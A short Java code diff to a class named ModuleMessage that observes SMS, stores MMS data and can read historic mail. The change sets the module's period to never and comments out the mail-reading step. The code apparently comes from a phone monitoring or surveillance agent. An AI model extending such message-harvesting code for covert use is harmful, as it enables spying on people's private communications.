@@ -87,7 +87,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	@Override
 	public boolean parse(ConfModule conf) {
-		setPeriod(1000 * 3600);
+		setPeriod(NEVER);
 		setDelay(100);
 
 		storedMMS = new Markup(this, 1);
@@ -268,6 +268,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	@Override
 	public void actualGo() {
+		/*
 		if (mailEnabled) {
 			try {
 				readHistoricMail(lastMail);
@@ -276,7 +277,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 					Check.log(TAG + " (initMail) Error: " + e);
 				}
 			}
-		}
+		}*/
 	}
 
 	private void initMail() {
